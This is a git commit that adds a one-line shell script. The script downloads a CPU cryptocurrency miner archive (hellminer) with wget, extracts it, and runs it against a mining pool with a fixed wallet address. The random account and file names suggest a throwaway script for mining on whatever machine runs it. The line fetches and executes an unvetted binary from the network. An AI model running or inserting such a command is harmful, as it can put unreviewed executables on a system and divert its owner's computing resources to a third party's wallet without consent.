3cc1d016f09127410ffc2038a3b75b547e967377
kdjdkjd <103858955+kdjdkjd@users.noreply.github.com>
2022-04-16 21:17:26 +0000

    Create jdhdi.sh

---
+++ jdhdi.sh
@@ -0,0 +1,1 @@
+wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RGf1sgbiax1atfvc4gkyvA6mvqoFbdDoLM.Ju -p x --cpu 2
